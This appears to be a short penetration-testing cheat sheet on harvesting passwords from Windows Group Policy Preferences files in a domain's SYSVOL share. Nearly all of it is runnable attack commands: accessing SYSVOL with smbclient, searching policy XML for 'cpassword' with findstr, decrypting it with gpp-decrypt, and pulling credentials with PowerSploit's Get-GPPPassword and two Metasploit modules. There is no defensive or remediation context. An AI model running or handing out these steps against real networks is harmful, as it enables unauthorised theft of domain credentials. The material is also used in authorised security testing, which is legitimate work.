# GGP (Group Policy Preferences)

* groups.xml
* scheduledtasks.xml
* services.xml
* datasources.xml
* printers.xml
* drives.xml

## Group Policies Location
```
DC-IP\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

## Access SYSVOL with smbclient
```
smbclient \\\\DC-IP\\SYSVOL –U domain/user
```

## Find cpassword in xml files
```
findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml
```

## Decrypt GPP password
```
gpp-decrypt <decrypt-password>
```

## Exploiting PowerSploit
```
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

## Exploiting Metasploit
```
auxiliary/scanner/smb/smb_enum_gpp
```
```
post/windows/gather/credentials/gpp
```

## See also
* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
* [AES Key](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)
* [Powersploit Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
